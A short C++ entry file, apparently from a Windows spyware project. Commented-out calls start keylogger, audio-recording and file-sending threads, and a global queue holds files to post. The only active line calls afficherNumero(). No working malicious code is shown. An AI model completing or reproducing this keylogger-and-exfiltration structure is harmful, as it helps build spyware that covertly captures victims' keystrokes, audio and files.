#include "headers/headers.hpp"

using namespace std;

atomic<std::string *>filesToPostSend((string *)(new string));

int main(){
    // HANDLE audioThread, keyloggerThread, fileSendThread;
    // DWORD audioThreadId, keyloggerThreadId, fileSendThreadId;
    // beginKeyloggerThread(keyloggerThread, reinterpret_cast<LPDWORD>(&keyloggerThreadId));
    // beginAudioRecording(audioThread, reinterpret_cast<LPDWORD>(&audioThreadId));
    // beginfileSendingThread(fileSendThread, reinterpret_cast<LPDWORD>(&fileSendThreadId));
    // WaitForSingleObject(audioThread, INFINITE);

    afficherNumero();
    
    return 0;
}